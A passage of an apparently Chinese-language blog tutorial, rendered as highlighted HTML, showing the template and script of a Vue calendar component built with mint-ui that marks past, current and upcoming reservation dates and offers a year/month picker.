&#125;</span></span><br><span class=\"line\"><span class=\"undefined\">  &#125;</span></span><br><span class=\"line\"><span class=\"undefined\">&#125;</span></span><br><span class=\"line\"><span class=\"undefined\"></span><span class=\"tag\">&lt;/<span class=\"name\">script</span>&gt;</span></span><br></pre></td></tr></table></figure>\n<p>日历子组件：</p>\n<figure class=\"highlight html\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">template</span>&gt;</span></span><br><span class=\"line\">  <span class=\"tag\">&lt;<span class=\"name\">div</span> <span class=\"attr\">class</span>=<span class=\"string\">\"calendar-container\"</span>&gt;</span></span><br><span class=\"line\">    // 日历标题</span><br><span class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">h1</span>&gt;</span>calendar<span class=\"tag\">&lt;/<span class=\"name\">h1</span>&gt;</span></span><br><span class=\"line\">    // 显示本月日期 2019-6，可点击</span><br><span class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">div</span> <span class=\"attr\">class</span>=<span class=\"string\">\"show-date\"</span> @<span class=\"attr\">click</span>=<span class=\"string\">\"clickData\"</span>&gt;</span>&#123;&#123;showDate&#125;&#125;<span class=\"tag\">&lt;/<span class=\"name\">div</span>&gt;</span></span><br><span class=\"line\">    // 今天的日期 2019-6-6</span><br><span class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">div</span> <span class=\"attr\">class</span>=<span class=\"string\">\"now-time\"</span>&gt;</span>今日：&#123;&#123;exactTime&#125;&#125;<span class=\"tag\">&lt;/<span class=\"name\">div</span>&gt;</span></span><br><span class=\"line\">    // 日历组件</span><br><span class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">div</span> <span class=\"attr\">class</span>=<span class=\"string\">\"calendar\"</span>&gt;</span></span><br><span class=\"line\">    // 日历组件头部</span><br><span class=\"line\">      <span class=\"tag\">&lt;<span class=\"name\">ul</span> <span class=\"attr\">class</span>=<span class=\"string\">\"calendar-header\"</span>&gt;</span></span><br><span class=\"line\">        <span class=\"tag\">&lt;<span class=\"name\">li</span>&gt;</span>日<span class=\"tag\">&lt;/<span class=\"name\">li</span>&gt;</span></span><br><span class=\"line\">        <span class=\"tag\">&lt;<span class=\"name\">li</span>&gt;</span>一<span class=\"tag\">&lt;/<span class=\"name\">li</span>&gt;</span></span><br><span class=\"line\">        <span class=\"tag\">&lt;<span class=\"name\">li</span>&gt;</span>二<span class=\"tag\">&lt;/<span class=\"name\">li</span>&gt;</span></span><br><span class=\"line\">        <span class=\"tag\">&lt;<span class=\"name\">li</span>&gt;</span>三<span class=\"tag\">&lt;/<span class=\"name\">li</span>&gt;</span></span><br><span class=\"line\">        <span class=\"tag\">&lt;<span class=\"name\">li</span>&gt;</span>四<span class=\"tag\">&lt;/<span class=\"name\">li</span>&gt;</span></span><br><span class=\"line\">        <span class=\"tag\">&lt;<span class=\"name\">li</span>&gt;</span>五<span class=\"tag\">&lt;/<span class=\"name\">li</span>&gt;</span></span><br><span class=\"line\">        <span class=\"tag\">&lt;<span class=\"name\">li</span>&gt;</span>六<span class=\"tag\">&lt;/<span class=\"name\">li</span>&gt;</span></span><br><span class=\"line\">      <span class=\"tag\">&lt;/<span class=\"name\">ul</span>&gt;</span></span><br><span class=\"line\">    // 日历组件主体</span><br><span class=\"line\">      <span class=\"tag\">&lt;<span class=\"name\">ul</span> <span class=\"attr\">class</span>=<span class=\"string\">\"calendar-body\"</span>&gt;</span></span><br><span class=\"line\">        <span class=\"tag\">&lt;<span class=\"name\">li</span> <span class=\"attr\">class</span>=<span class=\"string\">\"calendar-row\"</span> <span class=\"attr\">v-for</span>=<span class=\"string\">\"(item, index) in JSON.parse(calendarData)\"</span> <span class=\"attr\">:key</span>=<span class=\"string\">\"index\"</span>&gt;</span></span><br><span class=\"line\">          // 注意给 不同的日子加类名</span><br><span class=\"line\">          // 周末：weekend  工作日：weekday</span><br><span class=\"line\">          // 过去的事项 already-time 今天的事项 exact-time 将来的事项 soon-time</span><br><span class=\"line\">          // 给有事项的日子实现点击弹框，显示这天的事项内容</span><br><span class=\"line\">          <span class=\"tag\">&lt;<span class=\"name\">span</span> <span class=\"attr\">v-for</span>=<span class=\"string\">\"(subItem, subIndex) in item\"</span> <span class=\"attr\">:class</span>=<span class=\"string\">\"[subIndex == 0 || subIndex == 6? 'weekend': 'weekday', subItem.type == '1'? 'exact-time': '', subItem.type == '0'? 'already-time': '', subItem.type == '2'? 'soon-time': '']\"</span> @<span class=\"attr\">click</span>=<span class=\"string\">\"showInfo(subItem)\"</span> <span class=\"attr\">:key</span>=<span class=\"string\">\"subIndex\"</span>&gt;</span></span><br><span class=\"line\">            &#123;&#123;subItem.date&#125;&#125;</span><br><span class=\"line\">          <span class=\"tag\">&lt;/<span class=\"name\">span</span>&gt;</span></span><br><span class=\"line\">        <span class=\"tag\">&lt;/<span class=\"name\">li</span>&gt;</span></span><br><span class=\"line\">      <span class=\"tag\">&lt;/<span class=\"name\">ul</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;/<span class=\"name\">div</span>&gt;</span></span><br><span class=\"line\">    // popup 和 picker 搭配，实现 年月 选择   mint-ui 库</span><br><span class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">mt-popup</span> <span class=\"attr\">v-model</span>=<span class=\"string\">\"popupVisible\"</span> <span class=\"attr\">position</span>=<span class=\"string\">\"bottom\"</span>&gt;</span></span><br><span class=\"line\">      <span class=\"tag\">&lt;<span class=\"name\">mt-picker</span> <span class=\"attr\">:slots</span>=<span class=\"string\">\"slots\"</span> <span class=\"attr\">:showToolbar</span>=<span class=\"string\">\"true\"</span> <span class=\"attr\">:visibleItemCount</span>=<span class=\"string\">\"5\"</span> <span class=\"attr\">:itemHeight</span>=<span class=\"string\">\"itemsHeight\"</span> <span class=\"attr\">ref</span>=<span class=\"string\">\"picker\"</span>&gt;</span></span><br><span class=\"line\">        <span class=\"tag\">&lt;<span class=\"name\">img</span> <span class=\"attr\">src</span>=<span class=\"string\">\"@/assets/images/picker_cancel.png\"</span> <span class=\"attr\">class</span>=<span class=\"string\">\"picker_cancel\"</span> <span class=\"attr\">v-on:click</span>=<span class=\"string\">\"cancelFunc()\"</span>&gt;</span></span><br><span class=\"line\">        <span class=\"tag\">&lt;<span class=\"name\">img</span> <span class=\"attr\">src</span> =<span class=\"string\">\"@/assets/images/picker_sure.png\"</span> <span class=\"attr\">class</span>=<span class=\"string\">\"picker_sure\"</span> <span class=\"attr\">v-on:click</span>=<span class=\"string\">\"sureFunc()\"</span>&gt;</span></span><br><span class=\"line\">      <span class=\"tag\">&lt;/<span class=\"name\">mt-picker</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;/<span class=\"name\">mt-popup</span>&gt;</span></span><br><span class=\"line\">  <span class=\"tag\">&lt;/<span class=\"name\">div</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;/<span class=\"name\">template</span>&gt;</span></span><br></pre></td></tr></table></figure>\n<p>日历子组件逻辑：</p>\n<figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br><span class=\"line\">69</span><br><span class=\"line\">70</span><br><span class=\"line\">71</span><br><span class=\"line\">72</span><br><span class=\"line\">73</span><br><span class=\"line\">74</span><br><span class=\"line\">75</span><br><span class=\"line\">76</span><br><span class=\"line\">77</span><br><span class=\"line\">78</span><br><span class=\"line\">79</span><br><span class=\"line\">80</span><br><span class=\"line\">81</span><br><span class=\"line\">82</span><br><span class=\"line\">83</span><br><span class=\"line\">84</span><br><span class=\"line\">85</span><br><span class=\"line\">86</span><br><span class=\"line\">87</span><br><span class=\"line\">88</span><br><span class=\"line\">89</span><br><span class=\"line\">90</span><br><span class=\"line\">91</span><br><span class=\"line\">92</span><br><span class=\"line\">93</span><br><span class=\"line\">94</span><br><span class=\"line\">95</span><br><span class=\"line\">96</span><br><span class=\"line\">97</span><br><span class=\"line\">98</span><br><span class=\"line\">99</span><br><span class=\"line\">100</span><br><span class=\"line\">101</span><br><span class=\"line\">102</span><br><span class=\"line\">103</span><br><span class=\"line\">104</span><br><span class=\"line\">105</span><br><span class=\"line\">106</span><br><span class=\"line\">107</span><br><span class=\"line\">108</span><br><span class=\"line\">109</span><br><span class=\"line\">110</span><br><span class=\"line\">111</span><br><span class=\"line\">112</span><br><span class=\"line\">113</span><br><span class=\"line\">114</span><br><span class=\"line\">115</span><br><span class=\"line\">116</span><br><span class=\"line\">117</span><br><span class=\"line\">118</span><br><span class=\"line\">119</span><br><span class=\"line\">120</span><br><span class=\"line\">121</span><br><span class=\"line\">122</span><br><span class=\"line\">123</span><br><span class=\"line\">124</span><br><span class=\"line\">125</span><br><span class=\"line\">126</span><br><span class=\"line\">127</span><br><span class=\"line\">128</span><br><span class=\"line\">129</span><br><span class=\"line\">130</span><br><span class=\"line\">131</span><br><span class=\"line\">132</span><br><span class=\"line\">133</span><br><span class=\"line\">134</span><br><span class=\"line\">135</span><br><span class=\"line\">136</span><br><span class=\"line\">137</span><br><span class=\"line\">138</span><br><span class=\"line\">139</span><br><span class=\"line\">140</span><br><span class=\"line\">141</span><br><span class=\"line\">142</span><br><span class=\"line\">143</span><br><span class=\"line\">144</span><br><span class=\"line\">145</span><br><span class=\"line\">146</span><br><span class=\"line\">147</span><br><span class=\"line\">148</span><br><span class=\"line\">149</span><br><span class=\"line\">150</span><br><span class=\"line\">151</span><br><span class=\"line\">152</span><br><span class=\"line\">153</span><br><span class=\"line\">154</span><br><span class=\"line\">155</span><br><span class=\"line\">156</span><br><span class=\"line\">157</span><br><span class=\"line\">158</span><br><span class=\"line\">159</span><br><span class=\"line\">160</span><br><span class=\"line\">161</span><br><span class=\"line\">162</span><br><span class=\"line\">163</span><br><span class=\"line\">164</span><br><span class=\"line\">165</span><br><span class=\"line\">166</span><br><span class=\"line\">167</span><br><span class=\"line\">168</span><br><span class=\"line\">169</span><br><span class=\"line\">170</span><br><span class=\"line\">171</span><br><span class=\"line\">172</span><br><span class=\"line\">173</span><br><span class=\"line\">174</span><br><span class=\"line\">175</span><br><span class=\"line\">176</span><br><span class=\"line\">177</span><br><span class=\"line\">178</span><br><span class=\"line\">179</span><br><span class=\"line\">180</span><br><span class=\"line\">181</span><br><span class=\"line\">182</span><br><span class=\"line\">183</span><br><span class=\"line\">184</span><br><span class=\"line\">185</span><br><span class=\"line\">186</span><br><span class=\"line\">187</span><br><span class=\"line\">188</span><br><span class=\"line\">189</span><br><span class=\"line\">190</span><br><span class=\"line\">191</span><br><span class=\"line\">192</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">import</span> &#123; MessageBox &#125; <span class=\"keyword\">from</span> <span class=\"string\">'mint-ui'</span></span><br><span class=\"line\"><span class=\"keyword\">export</span> <span class=\"keyword\">default</span> &#123;</span><br><span class=\"line\">  name: <span class=\"string\">\"calendar\"</span>,</span><br><span class=\"line\">  props: &#123;</span><br><span class=\"line\">    propsTime: <span class=\"built_in\">String</span>,</span><br><span class=\"line\">    propsInfoList: <span class=\"built_in\">String</span></span><br><span class=\"line\">  &#125;,</span><br><span class=\"line\">  data() &#123;</span><br><span class=\"line\">    <span class=\"keyword\">return</span> &#123;</span><br><span class=\"line\">      <span class=\"comment\">// 接收父组件传值 '2019-06'</span></span><br><span class=\"line\">      time: <span class=\"string\">''</span>,</span><br><span class=\"line\">      <span class=\"comment\">// 接收父组件数据列表</span></span><br><span class=\"line\">      infoList: <span class=\"string\">''</span>,</span><br><span class=\"line\">      <span class=\"comment\">// 日历组件</span></span><br><span class=\"line\">      calendarData: [],</span><br><span class=\"line\">      <span class=\"comment\">// 页面展示的 '年-月'</span></span><br><span class=\"line\">      showDate: <span class=\"string\">''</span>,</span><br><span class=\"line\">      <span class=\"comment\">// 当前的 '年-月-日'</span></span><br><span class=\"line\">      exactTime: <span class=\"string\">''</span>,</span><br><span class=\"line\">      <span class=\"comment\">// picker 高度</span></span><br><span class=\"line\">      itemsHeight: <span class=\"number\">95</span> * <span class=\"built_in\">window</span>.screen.height / <span class=\"number\">1334</span>,</span><br><span class=\"line\">      <span class=\"comment\">// pupop 显示</span></span><br><span class=\"line\">      popupVisible: <span class=\"literal\">false</span>,</span><br><span class=\"line\">      <span class=\"comment\">// picker 数据</span></span><br><span class=\"line\">      slots: []</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">  &#125;,</span><br><span class=\"line\">  created() &#123;</span><br><span class=\"line\">    <span class=\"comment\">// 拿到父组件的 list</span></span><br><span class=\"line\">    <span class=\"keyword\">this</span>.infoList = <span class=\"keyword\">this</span>.propsInfoList</span><br><span class=\"line\">    <span class=\"comment\">// 拿到父组件的 '2019-06'</span></span><br><span class=\"line\">    <span class=\"keyword\">this</span>.time = <span class=\"keyword\">this</span>.propsTime.split(<span class=\"string\">'-'</span>)</span><br><span class=\"line\">    <span class=\"comment\">// 获取今天 '2019-06-06'</span></span><br><span class=\"line\">    <span class=\"keyword\">const</span> date = <span class=\"keyword\">this</span>.getToday()</span><br><span class=\"line\">    <span class=\"keyword\">this</span>.exactTime = date.slice(<span class=\"number\">0</span>,<span class=\"number\">3</span>).join(<span class=\"string\">'-'</span>)</span><br><span class=\"line\">    <span class=\"comment\">// 日历组件</span></span><br><span class=\"line\">    <span class=\"keyword\">this</span>.getCalendar(...(<span class=\"keyword\">this</span>.time))</span><br><span class=\"line\">    <span class=\"comment\">// 组装 picker 数组</span></span><br><span class=\"line\">    <span class=\"keyword\">this</span>.getSlotsArray(...(date.slice(<span class=\"number\">0</span>,<span class=\"number\">2</span>)))</span><br><span class=\"line\">  &#125;,</span><br><span class=\"line\">  methods: &#123;</span><br><span class=\"line\">    <span class=\"comment\">// 日历组件</span></span><br><span class=\"line\">    getCalendar(year, month) &#123;</span><br><span class=\"line\">      <span class=\"keyword\">let</span> _this = <span class=\"keyword\">this</span></span><br><span class=\"line\">      <span class=\"comment\">// 转存当天 '2019-06-06'</span></span><br><span class=\"line\">      <span class=\"keyword\">const</span> rightNow = _this.exactTime</span><br><span class=\"line\">      <span class=\"comment\">// 拼接 显示日历上的年月 '2019-05'</span></span><br><span class=\"line\">      _this.showDate = <span class=\"string\">`<span class=\"subst\">$&#123;year&#125;</span>-<span class=\"subst\">$&#123;month&#125;</span>`</span></span><br><span class=\"line\">      <span class=\"comment\">// 获取当月的第一天</span></span><br><span class=\"line\">      <span class=\"keyword\">const</span> firstDate = <span class=\"keyword\">new</span> <span class=\"built_in\">Date</span>(year, month - <span class=\"number\">1</span>, <span class=\"number\">1</span>)</span><br><span class=\"line\">      <span class=\"comment\">// 获取第一天周几</span></span><br><span class=\"line\">      <span class=\"keyword\">const</span> firstDay = firstDate.getDay()</span><br><span class=\"line\">      <span class=\"comment\">// 判断是否为闰年</span></span><br><span class=\"line\">      <span class=\"keyword\">const</span> isLeapYear = year % <span class=\"number\">100</span> == <span class=\"number\">0</span>? year % <span class=\"number\">400</span> == <span class=\"number\">0</span>? <span class=\"number\">1</span>: <span class=\"number\">0</span>: year % <span class=\"number\">4</span> == <span class=\"number\">0</span> ? <span class=\"number\">1</span>: <span class=\"number\">0</span></span><br><span class=\"line\">      <span class=\"comment\">// 获取今年每个月的天数</span></span><br><span class=\"line\">      <span class=\"keyword\">const</span> monthArray = [<span class=\"number\">31</span>, <span class=\"number\">28</span> + isLeapYear, <span class=\"number\">31</span>, <span class=\"number\">30</span>, <span class=\"number\">31</span>, <span class=\"number\">30</span>, <span class=\"number\">31</span>, <span class=\"number\">31</span>, <span class=\"number\">30</span>, <span class=\"number\">31</span>, <span class=\"number\">30</span>, <span class=\"number\">31</span>]</span><br><span class=\"line\">      <span class=\"comment\">// 计算星期的行数</span></span><br><span class=\"line\">      <span class=\"keyword\">const</span> weeekLines =<span class=\"built_in\">Math</span>.ceil((monthArray[month - <span class=\"number\">1</span>] + firstDay)/<span class=\"number\">7</span>)</span><br><span class=\"line\">      <span class=\"keyword\">let</span> calendar = []</span><br><span class=\"line\">      <span class=\"keyword\">for</span>(<span class=\"keyword\">let</span> i = <span class=\"number\">0</span>; i &lt; weeekLines; i++) &#123;</span><br><span class=\"line\">        <span class=\"keyword\">let</span> weeekLinesInfo = []</span><br><span class=\"line\">        <span class=\"keyword\">for</span>(<span class=\"keyword\">let</span> j = <span class=\"number\">0</span>; j &lt; <span class=\"number\">7</span>; j++) &#123;</span><br><span class=\"line\">          <span class=\"comment\">// 计算每个单元格的序号</span></span><br><span class=\"line\">          <span class=\"keyword\">const</span> cellNo = i * <span class=\"number\">7</span> + j</span><br><span class=\"line\">          <span class=\"comment\">// 计算每个单元格应该填充的日期</span></span><br><span class=\"line\">          <span class=\"keyword\">const</span> datePerLine = cellNo - firstDay + <span class=\"number\">1</span></span><br><span class=\"line\">          <span class=\"comment\">// 排除空白格</span></span><br><span class=\"line\">          <span class=\"keyword\">if</span>(datePerLine &lt;= <span class=\"number\">0</span> || datePerLine &gt; monthArray[month - <span class=\"number\">1</span>]) &#123;</span><br><span class=\"line\">            <span class=\"comment\">// 不存在的显示为 null 和 ''</span></span><br><span class=\"line\">            <span class=\"keyword\">let</span> outOfMonth = &#123;</span><br><span class=\"line\">              <span class=\"string\">\"type\"</span> : <span class=\"string\">'null'</span>,</span><br><span class=\"line\">              <span class=\"string\">\"date\"</span> : <span class=\"string\">''</span></span><br><span class=\"line\">            &#125;</span><br><span class=\"line\">            weeekLinesInfo[j] = outOfMonth</span><br><span class=\"line\">          &#125; <span class=\"keyword\">else</span> &#123;</span><br><span class=\"line\">            <span class=\"keyword\">let</span> day = (datePerLine + <span class=\"string\">''</span>).padStart(<span class=\"number\">2</span>,<span class=\"string\">'0'</span>)</span><br><span class=\"line\">            <span class=\"keyword\">let</span> inOfMonth = &#123;</span><br><span class=\"line\">              <span class=\"string\">\"type\"</span> : <span class=\"string\">''</span>,</span><br><span class=\"line\">              <span class=\"string\">\"date\"</span> : day,</span><br><span class=\"line\">              <span class=\"string\">\"isDone\"</span>: <span class=\"string\">''</span>,</span><br><span class=\"line\">              <span class=\"string\">\"infor\"</span>: <span class=\"string\">''</span></span><br><span class=\"line\">            &#125;</span><br><span class=\"line\">            <span class=\"comment\">// 今天背景变成一个红圈,这是今天 =&gt; rightNow</span></span><br><span class=\"line\">            <span class=\"keyword\">const</span> propsDate = <span class=\"string\">`<span class=\"subst\">$&#123;year&#125;</span>-<span class=\"subst\">$&#123;month&#125;</span>-<span class=\"subst\">$&#123;day&#125;</span>`</span></span><br><span class=\"line\">            <span class=\"comment\">// 比较每月的今天</span></span><br><span class=\"line\">            <span class=\"keyword\">if</span>(propsDate == rightNow)&#123;</span><br><span class=\"line\">              inOfMonth.type = <span class=\"string\">\"1\"</span></span><br><span class=\"line\">            &#125;</span><br><span class=\"line\">            <span class=\"keyword\">const</span> reservations = <span class=\"built_in\">JSON</span>.parse(_this.infoList)</span><br><span class=\"line\">            <span class=\"comment\">// 将 父组件传的 list 赋值在日历上</span></span><br><span class=\"line\">            <span class=\"comment\">// 预定列表 和 当月每一天比较</span></span><br><span class=\"line\">            <span class=\"keyword\">for</span>(<span class=\"keyword\">let</span> k = <span class=\"number\">0</span>; k &lt; reservations.length; k++) &#123;</span><br><span class=\"line\">              <span class=\"keyword\">if</span>(propsDate == reservations[k].date)&#123;</span><br><span class=\"line\">                <span class=\"comment\">// inOfMonth.type = \"1\"</span></span><br><span class=\"line\">                inOfMonth.infor = reservations[k].info</span><br><span class=\"line\">                <span class=\"keyword\">if</span>(rightNow == reservations[k].date) &#123;</span><br><span class=\"line\">                  inOfMonth.type = <span class=\"string\">\"1\"</span></span><br><span class=\"line\">                  inOfMonth.isDone = <span class=\"string\">\"doing\"</span></span><br><span class=\"line\">                &#125; <span class=\"keyword\">else</span> <span class=\"keyword\">if</span> (rightNow &gt; reservations[k].date) &#123;</span><br><span class=\"line\">                  inOfMonth.type = <span class=\"string\">\"0\"</span></span><br><span class=\"line\">                  inOfMonth.isDone = <span class=\"string\">\"pass\"</span></span><br><span class=\"line\">                &#125; <span class=\"keyword\">else</span> <span class=\"keyword\">if</span> (rightNow &lt; reservations[k].date) &#123;</span><br><span class=\"line\">                  inOfMonth.type = <span class=\"string\">\"2\"</span></span><br><span class=\"line\">                  inOfMonth.isDone = <span class=\"string\">\"will\"</span></span><br><span class=\"line\">                &#125;</span><br><span class=\"line\">              &#125;</span><br><span class=\"line\">            &#125;</span><br><span class=\"line\">            weeekLinesInfo[j] = inOfMonth</span><br><span class=\"line\">          &#125;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        calendar.push(weeekLinesInfo)</span><br><span class=\"line\">      &#125;</span><br><span class=\"line\">      <span class=\"built_in\">window</span>.console.log(calendar)</span><br><span class=\"line\">      <span class=\"comment\">// 即将遍历二维数组</span></span><br><span class=\"line\">      _this.calendarData = <span class=\"built_in\">JSON</span>.stringify(calendar)</span><br><span class=\"line\">    &#125;,</span><br><span class=\"line\">    <span class=\"comment\">// 格式化当前日期 YYYY-MM-DD</span></span><br><span class=\"line\">    getToday() &#123;</span><br><span class=\"line\">      <span class=\"keyword\">let</span> nowDate = <span class=\"keyword\">new</span> <span class=\"built_in\">Date</span>()</span><br><span class=\"line\">      <span class=\"keyword\">let</span> yy = nowDate.getFullYear().toString()</span><br><span class=\"line\">      <span class=\"keyword\">let</span> mm = (nowDate.getMonth() + <span class=\"number\">1</span> + <span class=\"string\">''</span>).padStart(<span class=\"number\">2</span>,<span class=\"string\">'0'</span>)</span><br><span class=\"line\">      <span class=\"keyword\">let</span> dd = (nowDate.getDate() + <span class=\"string\">''</span>).padStart(<span class=\"number\">2</span>,<span class=\"string\">'0'</span>)</span><br><span class=\"line\">      <span class=\"keyword\">let</span> hh = nowDate.getHours().toString().padStart(<span class=\"number\">2</span>,<span class=\"string\">'0'</span>)</span><br><span class=\"line\">      <span class=\"keyword\">let</span> mt = (nowDate.getMinutes() + <span class=\"string\">''</span>).padStart(<span class=\"number\">2</span>,<span class=\"string\">'0'</span>)</span><br><span class=\"line\">      <span class=\"keyword\">let</span> ss = (nowDate.getSeconds() + <span class=\"string\">''</span>).padStart(<span class=\"number\">2</span>,<span class=\"string\">'0'</span>)</span><br><span class=\"line\">      <span class=\"keyword\">return</span> [yy, mm, dd, hh, mt, ss]</span><br><span class=\"line\">      <span class=\"comment\">// return `$&#123;yy&#125;-$&#123;mm&#125;-$&#123;dd&#125;-$&#123;hh&#125;-$&#123;mt&#125;-$&#123;ss&#125;`</span></span><br><span class=\"line\">    &#125;,</span><br><span class=\"line\">    <span class=\"comment\">// 组装 picker 数组</span></span><br><span class=\"line\">    getSlotsArray(year, month)&#123;</span><br><span class=\"line\">      <span class=\"keyword\">let</span> _this = <span class=\"keyword\">this</span></span><br><span class=\"line\">      <span class=\"keyword\">let</span> yearArray = []</span><br><span class=\"line\">      <span class=\"keyword\">for</span>(<span class=\"keyword\">let</span> i = <span class=\"number\">-10</span> ; i &lt;= <span class=\"number\">10</span> ; i ++)&#123;</span><br><span class=\"line\">        yearArray.push(year - <span class=\"number\">1</span> + i)</span><br><span class=\"line\">      &#125;</span><br><span class=\"line\">      <span class=\"keyword\">let</span> monthArray = [<span class=\"number\">1</span>, <span class=\"number\">2</span>, <span class=\"number\">3</span>, <span class=\"number\">4</span>, <span class=\"number\">5</span>, <span class=\"number\">6</span>, <span class=\"number\">7</span>, <span class=\"number\">8</span>, <span class=\"number\">9</span>, <span class=\"number\">10</span>, <span class=\"number\">11</span>, <span class=\"number\">12</span>]</span><br><span class=\"line\">      <span class=\"keyword\">let</span> slots = [</span><br><span class=\"line\">        &#123;</span><br><span class=\"line\">          values:yearArray,</span><br><span class=\"line\">          className:<span class=\"string\">\"slot1\"</span>,</span><br><span class=\"line\">          defaultIndex: <span class=\"number\">11</span></span><br><span class=\"line\">        &#125;,</span><br><span class=\"line\">        &#123;</span><br><span class=\"line\">          values:monthArray,</span><br><span class=\"line\">          className:<span class=\"string\">\"slot2\"</span>,</span><br><span class=\"line\">          defaultIndex:month - <span class=\"number\">1</span></span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">      ]</span><br><span class=\"line\">      _this.slots = slots</span><br><span class=\"line\">    &#125;,</span><br><span class=\"line\">    <span class=\"comment\">// 显示日期弹窗</span></span><br><span class=\"line\">    clickData()&#123;</span><br><span class=\"line\">      <span class=\"keyword\">this</span>.popupVisible = <span class=\"literal\">true</span></span><br><span class=\"line\">    &#125;,</span><br><span class=\"line\">    <span class=\"comment\">// 取消按钮</span></span><br><span class=\"line\">    cancelFunc()&#123;</span><br><span class=\"line\">      <span class=\"keyword\">this</span>.popupVisible = <span class=\"literal\">false</span>;</span><br><span class=\"line\">    &#125;,</span><br><span class=\"line\">    <span class=\"comment\">// 确认按钮</span></span><br><span class=\"line\">    sureFunc() &#123;</span><br><span class=\"line\">      <span class=\"keyword\">let</span> _this = <span class=\"keyword\">this</span></span><br><span class=\"line\">      _this.popupVisible = <span class=\"literal\">false</span></span><br><span class=\"line\">      <span class=\"keyword\">const</span> clickData = _this.$refs.picker.getValues()</span><br><span class=\"line\">      <span class=\"keyword\">const</span> year = clickData[<span class=\"number\">0</span>] + <span class=\"string\">''</span></span><br><span class=\"line\">      <span class=\"keyword\">const</span> month = (clickData[<span class=\"number\">1</span>] + <span class=\"string\">''</span>).padStart(<span class=\"number\">2</span>,<span class=\"string\">'0'</span>)</span><br><span class=\"line\">      <span class=\"keyword\">const</span> day = _this.time[<span class=\"number\">2</span>]</span><br><span class=\"line\">      _this.getDateInfo(year, month)</span><br><span class=\"line\">      _this.getCalendar(year, month)</span><br><span class=\"line\">    &#125;,</span><br><span class=\"line\">    <span class=\"comment\">// 调用父组件定义的方法</span></span><br><span class=\"line\">    getDateInfo(year, month) &#123;</span><br><span class=\"line\">      <span class=\"keyword\">this</span>.$emit(<span class=\"string\">'getDateInfo'</span>, year, month)</span><br><span class=\"line\">    &#125;,</span><br><span class=\"line\">    <span class=\"comment\">// 点击展示某天的事项信息</span></span><br><span class=\"line\">    showInfo(info) &#123;</span><br><span class=\"line\">      <span class=\"keyword\">let</span> _this = <span class=\"keyword\">this</span></span><br><span class=\"line\">      <span class=\"keyword\">const</span> infor = info</span><br><span class=\"line\">      <span class=\"keyword\">if</span>(infor.infor) &#123;</span><br><span class=\"line\">        <span class=\"keyword\">const</span> [year, month] = _this.showDate.split(<span class=\"string\">'-'</span>)</span><br><span class=\"line\">        <span class=\"built_in\">console</span>.log(year, month, info)</span><br><span class=\"line\">        <span class=\"keyword\">const</span> titleDate = <span class=\"string\">`<span class=\"subst\">$&#123;year&#125;</span>-<span class=\"subst\">$&#123;month&#125;</span>-<span 